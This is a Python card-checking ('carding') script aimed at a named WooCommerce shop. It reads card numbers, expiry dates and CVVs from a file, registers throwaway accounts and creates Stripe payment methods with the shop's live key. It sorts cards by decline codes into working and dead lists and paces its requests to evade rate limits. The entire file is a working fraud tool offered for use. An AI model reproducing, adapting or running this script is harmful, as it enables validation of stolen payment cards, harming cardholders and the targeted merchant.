"""
WayuuMarket Checker v5.1
Real decline responses + error handling
"""
import requests
import random
import string
import uuid
import time
import os
import re

INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 5  # Increased delay to avoid rate limits

def randmail():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'

def get_bin(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','').upper()} | {d.get('bank',{}).get('name','')} | {d.get('country',{}).get('name','')}"
    except:
        pass
    return cc[:6]

def check_card(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    try:
        s = requests.Session()
        s.headers.update({
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        })
        
        # Register
        print("[*] Registering...")
        r = s.get('https://wayuumarket.com/my-account/', timeout=60)
        m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
        if not m:
            return 'ERROR', 'No register nonce'
        
        email = randmail()
        s.post('https://wayuumarket.com/my-account/', data={
            'email': email,
            'woocommerce-register-nonce': m.group(1),
            'register': 'Register',
        }, timeout=60)
        
        # Get payment page
        print("[*] Getting payment page...")
        r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=60)
        html = r.text
        
        fnonce = re.search(r'add-payment-method-nonce.*?value="([^"]+)"', html)
        wpnonce = re.search(r'name="_wpnonce"\s*value="([^"]+)"', html)
        
        # Create PM
        print("[*] Creating PM...")
        guid = str(uuid.uuid4())
        
        pm_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={'content-type': 'application/x-www-form-urlencoded'},
            data={
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'guid': guid,
                'muid': guid,
                'sid': guid,
                'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
            },
            timeout=60
        ).json()
        
        if 'error' in pm_resp:
            c = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
            msg = pm_resp['error'].get('message', '')
            
            if c in ['incorrect_cvc', 'insufficient_funds', 'generic_decline', 'expired_card', 
                     'lost_card', 'stolen_card', 'do_not_honor', 'card_velocity_exceeded']:
                return 'CCN', c
            return 'DEAD', c or msg[:40]
        
        pm_id = pm_resp.get('id', '')
        if not pm_id:
            return 'ERROR', 'No PM'
        
        print(f"[*] PM: {pm_id[:20]}...")
        
        # Submit form
        print("[*] Submitting form...")
        r = s.post(
            'https://wayuumarket.com/my-account/add-payment-method/',
            data={
                'payment_method': 'stripe',
                'wc-stripe-payment-token': 'new',
                'wc_stripe_payment_method': pm_id,
                'stripe_source': pm_id,
                'woocommerce-add-payment-method-nonce': fnonce.group(1) if fnonce else '',
                '_wpnonce': wpnonce.group(1) if wpnonce else '',
            },
            timeout=60
        )
        
        txt = r.text.lower()
        
        # Check responses
        if 'added' in txt and ('success' in txt or 'payment method' in txt):
            return 'CHARGED', 'Card Added!'
        
        if 'declined' in txt:
            return 'CCN', 'Declined'
        if 'insufficient' in txt:
            return 'CCN', 'Insufficient Funds'
        if 'incorrect' in txt and 'cvc' in txt:
            return 'CCN', 'Incorrect CVC'
        if 'security code' in txt:
            return 'CCN', 'Security Code Error'
        if 'expired' in txt:
            return 'CCN', 'Expired Card'
        if 'authentication' in txt or '3d secure' in txt:
            return 'CCN', '3DS Required'
        if 'lost' in txt or 'stolen' in txt:
            return 'CCN', 'Lost/Stolen'
        if 'do not honor' in txt:
            return 'CCN', 'Do Not Honor'
        if 'velocity' in txt:
            return 'CCN', 'Card Velocity Exceeded'
        
        # Check for any error message
        err_match = re.search(r'class="woocommerce-error"[^>]*>.*?<li>([^<]+)', r.text, re.DOTALL)
        if err_match:
            err = err_match.group(1).strip()
            if any(x in err.lower() for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen']):
                return 'CCN', err[:30]
            return 'DEAD', err[:30]
        
        brand = pm_resp.get('card', {}).get('brand', '').upper()
        return 'LIVE', f'PM OK ({brand})'
        
    except requests.exceptions.ConnectionError:
        return 'ERROR', 'Connection Reset (rate limit)'
    except requests.exceptions.Timeout:
        return 'ERROR', 'Timeout'
    except Exception as e:
        return 'ERROR', str(e)[:30]

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET CHECKER v5.1           ║
    ║    Real Decline Responses             ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("No cards!")
        return
    
    print(f"Cards: {len(cards)}")
    print(f"Delay: {DELAY}s (to avoid rate limits)")
    print("=" * 40)
    
    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0, 'error': 0}
    
    for i, card in enumerate(cards, 1):
        p = card.split('|')
        if len(p) < 4:
            continue
        
        cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['charged'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CHARGED|{msg}\n")
        elif status == 'CCN':
            print(f"[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['ccn'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CCN|{msg}\n")
        elif status == 'LIVE':
            print(f"[LIVE] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['live'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|LIVE|{msg}\n")
        elif status == 'ERROR':
            print(f"[ERROR] {msg}")
            stats['error'] += 1
            # Wait longer on error
            if 'rate' in msg.lower() or 'connection' in msg.lower():
                print("[*] Waiting 30s due to rate limit...")
                time.sleep(30)
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            stats['dead'] += 1
            open(DEAD_FILE, 'a').write(f"{full}|{msg}\n")
        
        print(f"[{t}s]")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 40)
    print(f"CHARGED: {stats['charged']}")
    print(f"CCN:     {stats['ccn']}")
    print(f"LIVE:    {stats['live']}")
    print(f"DEAD:    {stats['dead']}")
    print(f"ERROR:   {stats['error']}")

if __name__ == "__main__":
    main()
